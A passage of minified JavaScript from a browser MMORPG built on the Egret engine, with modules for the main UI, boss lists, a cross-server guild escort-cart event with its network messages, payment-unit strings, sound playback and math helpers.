win.open("ExpGoldWin");if(!s.GlobalConfig.ItemConfig[t])return void o.TipsCT.ins().showTips(l.RewardData.CURRENCY_NAME[t]+gettext("不足"));var h=win.open("ShopGoodsWarn");return h.setData(t,e),h},e.prototype.handleItemWayTouch=function(t){if(t)if(isNaN(Number(t[1]))){var e=void 0;if(isNaN(Number(t[0])))e=t.slice(1);else{var i=u.OpenSystem.ins().checkSysOpen(t[0]);if(!i)return void o.TipsCT.ins().showTips(u.OpenSystem.ins().getNoOpenTips(t[0]));e=t.slice(2)}h.Activity.ins().handleTurn(e)}else a.GlobalFun.jumpLink(t[1])},e.prototype.handleKeFuWayTouch=function(t){if(t){var e;if(isNaN(Number(t[0])))e=t.slice(0);else{var i=u.OpenSystem.ins().checkSysOpen(t[0]);if(!i)return void o.TipsCT.ins().showTips(u.OpenSystem.ins().getNoOpenTips(t[0]));e=t.slice(1)}h.Activity.ins().handleTurn(e)}},e}(n.BaseSystem);e.WarnCT=p,window.WarnCT=p,__reflect(p.prototype,"WarnCT",[]),Systemap.WarnCT=function(){return p.ins()},window.WarnCT=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainUICC=e.mainUICC=void 0;var n=i(0),o=i(101),s=i(20),a=i(36),r=i(95),l=i(218),h=i(299),u=i(41),p=i(43),d=i(7),c=i(125),f=i(12),g=i(15),m=i(47),v=i(32),y=i(221),C=i(78),T=i(187),b=function(t){function i(){var e=t.call(this)||this;return e.mapInfoCensusDic={},e.isInitView=!1,e.mainBossShow=!1,e.notInitViewShowTarget=[],e.playfunList=[],e.flag1=!1,e.flag2=!1,observe(e,function(t){if(s.GameMap.checkIsInKf3v3()){var e=t,i=e.killerName.split("_"),o=void 0;if("0"==i[0])o=i[1];else{var a=n.GlobalConfig.MonstersConfig[+i[1]];o=a?a.name:""}e.killerName=o,m.KfArenaSys.ins().collectStatus=0,win.open(h.GuileBattleReliveWin,5,10,e)}else s.GameMap.fbType==v.FbCT.FB_TYPE_INVADE?win.open(y.ReliveWin2,t):s.GameMap.fbType==v.FbCT.FB_TYPE_KF_DOMINATE?(C.DominateWorldCT.ins().collectStatus=0,C.DominateWorldCT.ins().collectOwnerHandle=0,win.close(T.CollectWin),win.open(l.ReliveWin,t)):win.open(l.ReliveWin,t)},Ts.actorDie),e}return __extends(i,t),i.prototype.initPayFun=function(){if(!(this.playfunList.length>0)){console.log("PlayFunConfig",Object.keys(n.GlobalConfig.PlayFunConfig).length);for(var t in n.GlobalConfig.PlayFunConfig){var e=n.GlobalConfig.PlayFunConfig[t];if(e&&e.cls){var i=window[e.cls]||egret.getDefinitionByName(e.cls)||u.PayfunIconData,o=new i(e);this.playfunList.push(o)}}}},i.prototype.getShowicon=function(t){void 0===t&&(t=1);for(var e=this.playfunList.length,i=[],n=0;e>n;n++){var o=this.playfunList[n];if(o.cfg&&o.cfg.pos==t){var s=o.checkShow();s&&o.cfg.pos==t&&i.push(o)}}return i},i.prototype.openCloseUpdate=function(){return __awaiter(this,void 0,void 0,function(){var t,e,i;return __generator(this,function(o){return t=this._uiId,e=n.GlobalConfig.InstanceConfig[s.GameMap.fubenID],e?(i=n.GlobalConfig.MainUIConfig[e.uiId],this._uiId=i?e.uiId:1):this._uiId=1,this.closeUI(t,this.openUI(this._uiId)),[2]})})},i.prototype.openUI=function(t){void 0===t&&(t=this._uiId);var e=[],i=n.GlobalConfig.MainUIConfig[t];if(i)for(var o in i){var s=i[o];for(var a in s){var r=s[a],l=r?r[0]:null;l&&(win.open(egret.getDefinitionByName(l)),e.push(l))}}return e},i.prototype.closeUI=function(t,e){void 0===t&&(t=this._uiId);var i=n.GlobalConfig.MainUIConfig[t];if(i)for(var o in i){var s=i[o];for(var a in s){var r=s[a],l=r?r[0]:null;!l||e&&-1!=e.indexOf(l)||win.close(egret.getDefinitionByName(l),!1)}}},i.prototype.onClickMap=function(t){return this.mainBossShow=t,t},i.prototype.postPayfunChange=function(t){return t},i.prototype.getMapBossList=function(t){void 0===t&&(t=1);var e=[],i=n.GlobalConfig.CityFbBossConfig;for(var o in i)i[o].TypeId==t&&e.push(i[o]);return e},i.prototype.getMapAllBossList=function(){var t=[],e=n.GlobalConfig.CityFbBossConfig;for(var i in e)5!=e[i].TypeId&&t.push(e[i]);return t},i.prototype.getMapBossHas=function(t){var e=n.GlobalConfig.CityFbBossConfig;for(var i in e)if(e[i].bossId==t)return!0;return!1},i.prototype.getKFBossList=function(){var t=[],e=n.GlobalConfig.WoLongCrossBossConfig;for(var i in e)t.push(e[i]);return t},i.prototype.getKFBossHas=function(t){var e=n.GlobalConfig.WoLongCrossBossConfig;for(var i in e)if(e[i].bossId==t)return!0;return!1},i.prototype.getBossTypeId=function(t){var e=n.GlobalConfig.CityFbBossConfig;for(var i in e)if(e[i].bossId==t)return p.CityCC.ins().CITI_FB_BOSS_TYPE[e[i].TypeId-1]-1;var o=n.GlobalConfig.WoLongCrossBossConfig;for(var i in o)if(o[i].bossId==t)return p.CityCC.ins().CITI_FB_BOSS_TYPE[3]-2;return console.log("配置中找不到该BossId：bossId"),0},i.prototype.CictyChange=function(){},i.prototype.setMapInfoEntityDic=function(t){if(e.MainUICC.mapInfoCensusDic||(e.MainUICC.mapInfoCensusDic={}),e.MainUICC.mapInfoCensusDic.entity||(e.MainUICC.mapInfoCensusDic.entity={}),!t.infoModel.isMy){var i=n.GlobalConfig.MonstersConfig[t.infoModel.configID];i&&i.type!=r.MonsterType.MonsterType_Fire&&i.type!=r.MonsterType.Summon&&(e.MainUICC.mapInfoCensusDic.entity[i.quality]||(e.MainUICC.mapInfoCensusDic.entity[i.quality]={count:0,arrId:{}}),e.MainUICC.mapInfoCensusDic.entity[i.quality].count+=1,e.MainUICC.mapInfoCensusDic.entity[i.quality].arrId||(e.MainUICC.mapInfoCensusDic.entity[i.quality].arrId={}),e.MainUICC.mapInfoCensusDic.entity[i.quality].arrId[i.id]=i.id)}},i.prototype.setMapInfoEquipDic=function(t){var i;e.MainUICC.mapInfoCensusDic||(e.MainUICC.mapInfoCensusDic={}),e.MainUICC.mapInfoCensusDic.equip||(e.MainUICC.mapInfoCensusDic.equip={});for(var o=0;o<t.length;o++){var s=t[o].id,r=t[o].count,l=t[o].qx;if(s==a.MoneyConst.gold)e.MainUICC.mapInfoCensusDic.equip[-1]||(e.MainUICC.mapInfoCensusDic.equip[-1]=0),e.MainUICC.mapInfoCensusDic.equip[-1]+=r;else{var h=n.GlobalConfig.ItemConfig[s];0==(null===(i=n.GlobalConfig.ItemDescConfig[h.descIndex])||void 0===i?void 0:i.type)&&(e.MainUICC.mapInfoCensusDic.equip[l]||(e.MainUICC.mapInfoCensusDic.equip[l]=0),e.MainUICC.mapInfoCensusDic.equip[l]+=r)}}},i.prototype.setDevilOpenTime=function(){var t=d.GameServerCC.isInOtherPlayTime()?n.GlobalConfig.DevilBossBase.startTime2:n.GlobalConfig.DevilBossBase.startTime,e=t[0],i=t[1],o=new Date(d.GameServerCC.serverTime);o.setHours(e,i,0,0),this.devilStartTime=o.getTime(),console.log("魔界入侵开启时间,",this.devilStartTime),d.GameServerCC.serverTime<this.devilStartTime&&(Timer.has(this.timeHandler,this)||Timer.start(1e3,0,this.timeHandler,this))},i.prototype.judgeBossState=function(){if(0==c.DevildomSys.ins().killedState.length)return!0;for(var t in c.DevildomSys.ins().killedState)if(!c.DevildomSys.ins().killedState[t])return 5==Number(t)&&1==c.DevildomSys.ins().bossState?!0:!1;return!0},i.prototype.timeHandler=function(){d.GameServerCC.serverTime>=this.devilStartTime?this.judgeBossState()?(this.devilStatus=2,this.postDevilEnterChange(),Timer.stop(this.timeHandler,this)):(this.devilStatus=1,this.flag1||(this.postDevilEnterChange(),this.flag1=!0)):this.devilStatus=0},i.prototype.devilEnterShow=function(){return f.OpenSystem.ins().checkSysOpen(g.SystemType.DevilBoss)?void 0!=c.DevildomSys.ins().lastDevildom&&c.DevildomSys.ins().lastDevildom?0:this.judgeBossState()?1==this.devilStatus?1:0:1:0},i.prototype.postDevilEnterChange=function(){},i.prototype.getMapInfoCensusEntity=function(){return e.MainUICC.mapInfoCensusDic.entity},i.prototype.getMapInfoCensusEquip=function(){return e.MainUICC.mapInfoCensusDic.equip},i.prototype.startGuide=function(t){return t},__decorate([post()],i.prototype,"onClickMap",null),__decorate([post()],i.prototype,"postPayfunChange",null),__decorate([post()],i.prototype,"CictyChange",null),__decorate([post()],i.prototype,"postDevilEnterChange",null),__decorate([post()],i.prototype,"startGuide",null),i}(o.CC);e.mainUICC=b,window.mainUICC=b,__reflect(b.prototype,"mainUICC",[]),e.MainUICC=new b,window.MainUICC=e.MainUICC},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SkillUtil=void 0;var n=i(0),o=i(70),s=function(){function t(){}return t.getDesc=function(t,e){if(!t)return"";var i=n.GlobalConfig.SkillsDescConfig[t.desc],o="";if(i&&i.desc&&(o=i.desc),e=e||t.desc_ex)for(var s=e.length,a=0;s>a;a++)o=o.replace("%s",""+e[a]);return o},t.getName=function(t){var e=n.GlobalConfig.SkillsDescConfig[t.desc];return e?e.name:""},t.getCD=function(t){var e=n.GlobalConfig.SkillsDescConfig[t.desc];return e?e.cd:0},t.getIcon=function(t){return 1e3*o.MathUtils.toInteger(t/1e3)+"_png"},t.getDesc1=function(t,e){return t=t.replace("%s",""+e)},t}();e.SkillUtil=s,window.SkillUtil=s,__reflect(s.prototype,"SkillUtil",[]),window.SkillUtil=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PayTypeEnum=e.PayUtils=void 0;var n=i(0),o=function(){function t(){}return t.getPayUnitStr=function(t,e){e=e||s.CN;var i=n.GlobalConfig.PayUnitConfig?n.GlobalConfig.PayUnitConfig[e]:n.GlobalConfig.payUnitConfig[e];if(!i)return void console.error(e+"在表PayUnitConfig中不存在");var o=/\%s(\d+)\%/g,a=i.desc.replace(o,t+"");return a},t.getDiscount=function(t){},t}();e.PayUtils=o,window.PayUtils=o,__reflect(o.prototype,"PayUtils",[]);var s;!function(t){t.CN="cn",t.CN1="cn1",t.NT="nt",t.EN="en",t.Japanese="ja",t.Korean="ko"}(s=e.PayTypeEnum||(e.PayTypeEnum={})),window.PayTypeEnum=s,window.PayTypeEnum=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.View_BianQiang=void 0;var n=i(1),o=i(0),s=i(12),a=i(25),r=i(7),l=i(85),h=i(293),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="PowerSkin",e.sourceArr=[],e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.sourceArr=[],this.list.itemRenderer=h.Item_BianQiang,this.addEvent(egret.TouchEvent.TOUCH_TAP,this.closeBtn,this.close),-1!=l.Setting.ins().getValue1(l.ClientSet.BianQiang_Idx)&&l.Setting.ins().getValue1(l.ClientSet.BianQiang_Idx)==r.GameServerCC.serverOpenDay&&win.close(this);var i=1;t[0]&&(i=t[0]);for(var n in o.GlobalConfig.PowerConfig)if(1!=o.GlobalConfig.PowerConfig[n].id||!a.Recharge.ins().isGetAllReward()){var u=o.GlobalConfig.PowerConfig[n].limitId;if(isNaN(u)||s.OpenSystem.ins().checkSysOpen(u)){var p={data:o.GlobalConfig.PowerConfig[n],idx:i};(i==o.GlobalConfig.PowerConfig[n].type||3==o.GlobalConfig.PowerConfig[n].type)&&this.sourceArr.push(p)}}this.list.dataProvider=this.arc=new eui.ArrayCollection(this.sourceArr)},e.prototype.removeDisplay=function(){if(this.skin){if(this.sourceArr=[],this.isSelect.selected&&l.Setting.ins().setValue(l.ClientSet.BianQiang_Idx,r.GameServerCC.serverOpenDay),this.list&&this.list.numElements>0)for(var t=this.list.numElements-1;t>=0;t--){var e=this.list.getElementAt(t);e&&e.clearAll()}this.arc&&this.arc.replaceAll(null),this.list&&(this.list.dataProvider=null),this.removeTouchEvent(this.closeBtn,this.close)}},e.prototype.close=function(){win.close(this)},e}(n.BaseView);e.View_BianQiang=u,window.View_BianQiang=u,__reflect(u.prototype,"View_BianQiang",[]),window.View_BianQiang=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrossDartCarCT=void 0;var n=i(18),o=i(8),s=i(135),a=i(14),r=i(0),l=i(15),h=i(58),u=i(28),p=i(107),d=i(12),c=i(7),f=i(2),g=i(27),m=function(t){function e(){var e=t.call(this)||this;return e.curSendTimes=0,e.curSendState=0,e.carTypeDic={},e.tranTimes=0,e.bolBuyInsure=!1,e.arriveTime=0,e.luckAdd=0,e.dartCarInfoList=[],e.memInfoList=[],e.logInfoList=[],e.bolReqLog=!1,e.bolLogChange=!1,e.isOpening=!1,e.actStartTime=0,e.actEndTIme=0,e.sysId=PackageID.CrossDart,e.regNetMsg(30,e.postGetJoinInfo),e.regNetMsg(31,e.postPlunder),e.regNetMsg(32,e.postPlayerInfo),e.regNetMsg(33,e.postGetCarInfo),e.regNetMsg(34,e.postGetLog),e.regNetMsg(35,e.postGetAllInfo),e.regNetMsg(38,e.postGetTrantInfo),observe(e,e.initActTimer,s.GameApp.ins().postZeroInit,c.GameServerCC.postServerTimeFlus),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initActTimer=function(){var t=r.GlobalConfig.GuildEscortCartBaseConfig.closeTime;if(t){var e=c.GameServerCC.serverTime,i=t.split("-");2==i.length&&(this.actStartTime=o.DateUtils.formatStrTimeToToday1(i[0],e),this.actEndTIme=o.DateUtils.formatStrTimeToToday1(i[1],e),Timer.has(this.timerFun,this)||Timer.start(3e3,0,this.timerFun,this))}},e.prototype.getRoadColor=function(t){if(!this.roadColorDic){this.roadColorDic={};var e=r.GlobalConfig.GuildEscortCartBaseConfig.Road;for(var i in e)e[i][0]&&(this.roadColorDic[Number(e[i][0])]=n.ColorUtil.stringToNumber(e[i][1]))}return this.roadColorDic[t]||16777215},e.prototype.getCarLuckObj=function(t){for(var e,i=1e-4*t,n=r.GlobalConfig.GuildEscortCartBaseConfig.luckyColor,o=0;o<n.length&&!(n[o][0]>i);o++)e=n[o];return e},e.prototype.getRoadAddVal=function(t){if(!this.roadAddValDic){this.roadAddValDic={};var e=r.GlobalConfig.GuildEscortCartBaseConfig.Road;for(var i in e)e[i][0]&&(this.roadAddValDic[Number(e[i][0])]=e[i][2])}return this.roadAddValDic[t]||0},e.prototype.getAddition=function(t){if(!t)return 0;for(var e=c.GameServerCC.serverTime,i=0,n=0,o=t.timeRange;n<o.length;n++){var s=o[n];if(i=s.range,e<=s.time)break}return this.getRoadAddVal(i)},e.prototype.getLeftMemsNum=function(){for(var t=0,e=0,i=0,n=this.memInfoList;i<n.length;i++){var o=n[i];t+=1,0==o.bolFail&&(e+=1)}return[t,e]},e.prototype.getCarInfoByGuildId=function(t){for(var e=0,i=this.dartCarInfoList;e<i.length;e++){var n=i[e];if(n.guildId==t)return n}return null},e.prototype.checkStopGuildOp=function(t){return void 0===t&&(t=!0),this.checkInActTime()?(t&&g.WarnWin.show(gettext("跨服镖车活动期间不能操作"),null,this),!0):!1},e.prototype.checkInActTime=function(t){void 0===t&&(t=!1);var e=r.GlobalConfig.OpenSystemConfig[l.SystemType.CrossDartCar];if(e.openDay>0&&c.GameServerCC.serverOpenDay+1<e.openDay)return!1;var i=r.GlobalConfig.GuildEscortCartBaseConfig,n=i.openDay?i.openDay:[],s=c.GameServerCC.serverTime,a=new Date(s),h=a.getDay();if(-1==n.indexOf(h)||this.actStartTime>c.GameServerCC.serverTime||this.actEndTIme<c.GameServerCC.serverTime){if(t){for(var u="",p=0,d=n;p<d.length;p++){var g=d[p];7==g&&(g=0),u+=o.DateUtils.WEEK_CN2[g]+","}u&&(u=u.slice(0,-1),f.TipsCT.ins().showTips(gettext("每周{0}{1}活动开启",u,i.closeTime)))
}return!1}return!0},e.prototype.checkInSignUpTime=function(t){if(void 0===t&&(t=!1),0!=this.checkInActTime(t)){var e=r.GlobalConfig.GuildEscortCartBaseConfig;return 0==o.DateUtils.checkInStrTime(e.signUpTime,c.GameServerCC.serverTime)?(t&&f.TipsCT.ins().showTips(gettext("当前不在报名时间")),!1):!0}},e.prototype.checkInStartTime=function(t){return void 0===t&&(t=!1),0!=this.checkInActTime(t)?0==this.getCurDartTimeState()?(t&&f.TipsCT.ins().showTips(gettext("当前不在可发车时间")),!1):!0:void 0},e.prototype.getCarState=function(t){var i=0;return i=e.ins().carTypeDic[t]?e.ins().curSendTimes>t?3:e.ins().curSendTimes==t&&(!e.ins().curSendState||e.ins().curSendState&&e.ins().arriveTime<=c.GameServerCC.serverTime)?3:e.ins().curSendTimes==t&&e.ins().curSendState?2:1:0},e.prototype.getCarStateStr=function(t,e){void 0===e&&(e=!1);var i="",o=0;switch(t){case 0:i=gettext("未购买"),o=n.ColorUtil.RED_COLOR_N;break;case 1:i=gettext("已购买未出发"),o=n.ColorUtil.ROLENAME_COLOR_YELLOW;break;case 2:i=gettext("运送中"),o=n.ColorUtil.GREEN_COLOR_N;break;case 3:i=gettext("已完成"),o=n.ColorUtil.RED_COLOR_N}return e?"|C:"+o+"&T:"+i+"|":i},e.prototype.getGuildCarState=function(t){return this.curSendTimes>t?2:this.curSendTimes<t?0:this.curSendState?e.ins().arriveTime<=c.GameServerCC.serverTime?2:1:this.curSendTimes==t?2:0},e.prototype.getGuildCarStateStr=function(t,e){void 0===e&&(e=0);var i="",o=0;switch(t){case 0:i=gettext("未发出"),o=n.ColorUtil.ROLENAME_COLOR_YELLOW;break;case 1:i=gettext("已发出"),o=n.ColorUtil.GREEN_COLOR_N;break;case 2:i=gettext("已完成"),o=n.ColorUtil.RED_COLOR_N}return e&&(i=gettext("第{0}趟-",e)+i),"|C:"+o+"&T:"+i+"|"},e.prototype.getCurDartTimeState=function(){var t=r.GlobalConfig.GuildEscortCartBaseConfig;return o.DateUtils.checkInStrTime(t.startTime1,c.GameServerCC.serverTime)?1:o.DateUtils.checkInStrTime(t.startTime2,c.GameServerCC.serverTime)?2:0},e.prototype.getCurSendTimes=function(){var t;if(t=this.curSendState?this.curSendTimes:this.getCurDartTimeState(),!t){t=1;var e=r.GlobalConfig.GuildEscortCartBaseConfig.startTime2;if(e){var i=e.split("-");if(2==i.length){var n=o.DateUtils.formatStrTimeToToday1(i[0],c.GameServerCC.serverTime);n<c.GameServerCC.serverTime&&(t=2)}}}return t},e.prototype.timerFun=function(){var t=this.isOpening;this.actStartTime<=c.GameServerCC.serverTime&&c.GameServerCC.serverTime<=this.actEndTIme&&(this.isOpening=!0),this.isOpening&&(this.isOpening=e.ins().checkInActTime(!1)&&d.OpenSystem.ins().checkSysOpen(l.SystemType.CrossDartCar)),t!=this.isOpening&&this.postRedChange()},e.prototype.startSendCar=function(){if(e.ins().checkInStartTime(!0)){if(u.Guild.ins().myOffice!=p.GuildOffice.GUILD_BANGZHU&&u.Guild.ins().myOffice!=p.GuildOffice.GUILD_FUBANGZHU)return void f.TipsCT.ins().showTips(gettext("公会会长或者副会长才能发车"));if(1==e.ins().curSendState)return void f.TipsCT.ins().showTips(gettext("已发出"));var t=e.ins().getCurSendTimes(),i=e.ins().getCarState(t);return 1!=i?void f.TipsCT.ins().showTips(e.ins().getCarStateStr(i)):void g.WarnWin.show(gettext("发车后未报名的行会成员将无法再报名进入车队，是否确认发车？"),function(){e.ins().sendStartCar()},this)}},e.prototype.clearData=function(){},e.prototype.sendJoin=function(t){var e=this.getBytes(29);e.writeByte(t),this.sendToServer(e)},e.prototype.sendGetJoinInfo=function(){var t=this.getBytes(30);this.sendToServer(t)},e.prototype.postGetJoinInfo=function(t){this.carTypeDic=[];for(var e=t.readByte(),i=0;e>i;i++){var n=t.readByte();this.carTypeDic[n]=t.readByte()}console.log("镖车报名情况 ",this.carTypeDic)},e.prototype.sendPlunder=function(t){var e=this.getBytes(31);e.writeInt(t),this.sendToServer(e)},e.prototype.postPlunder=function(t){var e=t.readByte();switch(e){case 1:f.TipsCT.ins().showTips(gettext("已超过可截取路段"));break;case 2:f.TipsCT.ins().showTips(gettext("正在战斗"));break;case 3:f.TipsCT.ins().showTips(gettext("无剩余掠夺"));break;case 4:f.TipsCT.ins().showTips(gettext("已经劫过"))}},e.prototype.sendGetPlayerInfo=function(){var t=this.getBytes(32);this.sendToServer(t)},e.prototype.postPlayerInfo=function(t){this.tranTimes=t.readByte(),this.bolBuyInsure=t.readBoolean()},e.prototype.sendGetCarInfo=function(){var t=this.getBytes(33);this.sendToServer(t)},e.prototype.postGetCarInfo=function(t){this.curSendTimes=t.readByte(),this.curSendState=t.readByte();var e=t.readInt();e=o.DateUtils.formatMiniDateTime(e),this.arriveTime=e+1e3*r.GlobalConfig.GuildEscortCartBaseConfig.disTime,this.luckAdd=t.readUnsignedInt();var i=t.readUnsignedByte();this.memInfoList=[];for(var n=0;i>n;n++){var s={roleID:t.readInt(),bolFail:t.readBoolean()};this.memInfoList.push(s)}},e.prototype.sendGetLog=function(){var t=this.getBytes(34);this.sendToServer(t)},e.prototype.postGetLog=function(t){var e=this.logInfoList.length;this.logInfoList=[];for(var i=t.readUnsignedByte(),n=0;i>n;n++){var o=t.readByte(),s=void 0,a=void 0;switch(o){case 1:a=t.readString();var l=t.readInt();s=l?h.LangUtils.formatStr(r.GlobalConfig.GuildEscortCartBaseConfig.txtLucky,[a,.01*l+"%"]):h.LangUtils.formatStr(r.GlobalConfig.GuildEscortCartBaseConfig.txtBuy,[a]);break;case 2:a=t.readString(),s=h.LangUtils.formatStr(r.GlobalConfig.GuildEscortCartBaseConfig.txtStart,[a]);break;case 3:a=t.readString();var u=t.readByte(),p=1==u?r.GlobalConfig.GuildEscortCartBaseConfig.txtBattleWin:r.GlobalConfig.GuildEscortCartBaseConfig.txtBattleLost;s=h.LangUtils.formatStr(p,[a]);break;case 4:s=r.GlobalConfig.GuildEscortCartBaseConfig.txtArrive;break;case 5:s=r.GlobalConfig.GuildEscortCartBaseConfig.txtOver;break;case 6:s=r.GlobalConfig.GuildEscortCartBaseConfig.txtAutoStart}this.logInfoList.push(s)}this.logInfoList.length&&e!=this.logInfoList.length&&(this.bolLogChange=!0,this.postRedChange(),this.bolReqLog||f.TipsCT.ins().showCenterTips4(this.logInfoList[this.logInfoList.length-1])),this.bolReqLog=!1},e.prototype.sendGetAllInfo=function(){var t=this.getBytes(35);this.sendToServer(t)},e.prototype.postGetAllInfo=function(t){var e=t.readUnsignedByte();this.dartCarInfoList=[];for(var i=10*r.GlobalConfig.GuildEscortCartBaseConfig.disTime,n=0;e>n;n++){var s={guildName:t.readString(),startTime:t.readInt(),arriveTime:0,luck:t.readUnsignedInt(),line:t.readUnsignedByte(),tranT:t.readUnsignedByte(),bolAtked:t.readBoolean(),guildId:t.readInt(),tranTimes:0,timeRange:[]};s.startTime=o.DateUtils.formatMiniDateTime(s.startTime),s.arriveTime=s.startTime+1e3*r.GlobalConfig.GuildEscortCartBaseConfig.disTime;var a=r.GlobalConfig.GuildEscortCartLineConfig[s.line];if(a&&a.terrainRange)for(var l=0,h=0;h<a.terrainRange.length;h++){var u=a.terrainRange[h];l+=u[1];var p={time:s.startTime+i*l,range:u[0]};s.timeRange.push(p)}this.dartCarInfoList.push(s)}},e.prototype.sendStartCar=function(){var t=this.getBytes(36);this.sendToServer(t)},e.prototype.sendBuyInsure=function(){var t=this.getBytes(37);this.sendToServer(t)},e.prototype.sendGetTrantInfo=function(){var t=this.getBytes(38);this.sendToServer(t)},e.prototype.postGetTrantInfo=function(t){for(var e=t.readUnsignedByte(),i=0;e>i;i++)for(var n=t.readInt(),o=t.readUnsignedByte(),s=0,a=this.dartCarInfoList;s<a.length;s++){var r=a[s];r.guildId==n&&(r.tranTimes=o)}},e.prototype.postRedChange=function(){},__decorate([post()],e.prototype,"postGetJoinInfo",null),__decorate([post()],e.prototype,"postPlunder",null),__decorate([post()],e.prototype,"postPlayerInfo",null),__decorate([post()],e.prototype,"postGetCarInfo",null),__decorate([post()],e.prototype,"postGetLog",null),__decorate([post()],e.prototype,"postGetAllInfo",null),__decorate([post()],e.prototype,"postGetTrantInfo",null),__decorate([post()],e.prototype,"postRedChange",null),e}(a.BaseSystem);e.CrossDartCarCT=m,window.CrossDartCarCT=m,__reflect(m.prototype,"CrossDartCarCT",[]),Systemap.InvadeCT=function(){return m.ins()},window.InvadeCT=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SoundUtil=e.SoundEnum=void 0;var n,o=i(61),s=i(112),a=i(621);!function(t){t.RUN="longlin_a_pd_mp3",t.WINDOW="longlin_a_dkjm_mp3",t.TASK="longlin_b_renwu_mp3",t.LEVEL_UP="longlin_b_shengji_mp3",t.SCENE="longlin_a_zyz_mp3",t.EQUIP="longlin_a_chuandai_mp3",t.CREATE_ROLE="longlin_a_chuangjue_mp3",t.FORGE="longlin_a_qianghua_mp3",t.SMELT="longlin_b_ronglian_mp3",t.SKILL_UP="longlin_b_jineng_mp3"}(n=e.SoundEnum||(e.SoundEnum={})),window.SoundEnum=n,window.SoundEnum=n;var r=function(){function t(){}return t.onPause=function(){t.enable=!1},t.onResume=function(){o.LocationProperty.isIOS?Main.ins.stage.once(egret.TouchEvent.TOUCH_BEGIN,t.playFirstCound,t):t.enable=s.SysSetting.ins().getBool(s.SysSetting.SOUND_EFFECT)},t.playFirstCound=function(){t.enable=s.SysSetting.ins().getBool(s.SysSetting.SOUND_EFFECT)},Object.defineProperty(t,"enable",{get:function(){return this._enable},set:function(t){this._enable=t,t?this.bgSound&&(this.bgSC=this.bgSound.play(0,0)):this.stopAll()},enumerable:!1,configurable:!0}),t.play=function(t,e){return void 0===e&&(e=1),__awaiter(this,void 0,void 0,function(){var i,n;return __generator(this,function(o){switch(o.label){case 0:return this._enable?window&&window.platform&&window.platform.createInnerAudioContext&&urlParam.isMiniGame?(a.PlatformSound.play(t,0>=e),[2]):[4,RES.getResAsync(t)]:[2];case 1:return(i=o.sent())?0>=e&&null!=this.effCache[t]?[2]:(i.type=egret.Sound.EFFECT,n=i.play(0,e),this.effCache[t]=n,this.url2url[n.$url]=t,n.once(egret.Event.SOUND_COMPLETE,this.onSoundComplete,this),[2]):[2]}})})},t.playBg=function(t){return __awaiter(this,void 0,void 0,function(){var e;return __generator(this,function(i){switch(i.label){case 0:return this._enable?(e=this,[4,RES.getResAsync(t)]):[2];case 1:return e.bgSound=i.sent(),this.bgSound?(this.bgSound.type=egret.Sound.MUSIC,this.bgSC&&this.bgSC.stop(),this.bgSC=this.bgSound.play(0,0),[2]):[2]}})})},t.stop=function(t){if(window&&window.platform&&window.platform.createInnerAudioContext&&urlParam.isMiniGame)return void a.PlatformSound.stop(t);var e=this.effCache[t];e&&(e.stop(),delete this.url2url[e.$url]),delete this.effCache[t]},t.stopAll=function(){if(window&&window.platform&&window.platform.createInnerAudioContext&&urlParam.isMiniGame)return void a.PlatformSound.stopAll();this.bgSC&&this.bgSC.stop();for(var t in this.effCache)this.stop(t)},t.onSoundComplete=function(t){delete this.effCache[this.url2url[t.currentTarget.$url]],delete this.url2url[t.currentTarget.$url]},t.WINDOW_OPEN=!1,t._enable=!0,t.effCache={},t.url2url={},t}();e.SoundUtil=r,window.SoundUtil=r,__reflect(r.prototype,"SoundUtil",[]),window.SoundUtil=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MathUtils=void 0;var n=function(){function t(){}return t.getAngle=function(t){return 180*t/Math.PI},t.getRadian=function(t){return t/180*Math.PI},t.getRadian2=function(t,e,i,n){var o=i-t,s=n-e;return Math.atan2(s,o)},t.getDistance=function(t,e,i,n){var o=i-t,s=n-e,a=o*o+s*s;return Math.sqrt(a)},t.getDistanceByObject=function(t,e){return this.getDistance(t.x,t.y,e.x,e.y)},t.getDistanceX2ByObject=function(t,e){var i=t.x-e.x,n=t.y-e.y;return i*i+n*n},t.getDirMove=function(t,e,i,n){void 0===i&&(i=0),void 0===n&&(n=0);var o=this.getRadian(t),s={x:0,y:0};return s.x=Math.cos(o)*e+i,s.y=Math.sin(o)*e+n,s},t.limit=function(t,e){t=Math.min(t,e),e=Math.max(t,e);var i=e-t;return t+Math.random()*i},t.limitInteger=function(t,e){return Math.round(this.limit(t,e))},t.randomArray=function(t){var e=Math.floor(Math.random()*t.length);return t[e]},t.toInteger=function(t,e){void 0===e&&(e=0);var i=0;if(0!=t){var n=t/Math.abs(t),o=0;0==e?o=Math.abs(t)>>0:1==e?o=Math.abs(Math.ceil(t))>>0:2==e&&(o=Math.abs(Math.round(t))>>0),i=n*o}return i},t.setIntervalFunction=function(t,e,i){var n=0;this.timer=egret.setInterval(function(){i>n&&(n++,n>=i&&(e(),clearInterval(this.timer)))},t,1e3)},t.toFixed=function(t,e,i){void 0===i&&(i=0);var n=t*Math.pow(10,e);return n=this.toInteger(n,i)/Math.pow(10,e)},t.mid_point=function(t,e,i,n){var o=(t+i)/2,s=(e+n)/2;return new egret.Point(o,s)},t.tileLine=function(t,e,i,n){var o=[];if(i!=t)for(var s=(n-e)/(i-t),a=n-s*i,r=i>t?1:-1,l=Math.abs(i-t),h=0;l>h;++h){var u=t+h*r>>0,p=s*u+a>>0;o.push(u),o.push(p)}else for(var d=Math.min(e,n),c=Math.max(e,n),f=d;c>=f;f++)o.push(t),o.push(f);return o},t.random=function(t,e){return Math.floor(Math.random()*(e-t+1)+t)},t}();e.MathUtils=n,window.MathUtils=n,__reflect(n.prototype,"MathUtils",[]),window.MathUtils=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataType=void 0;var 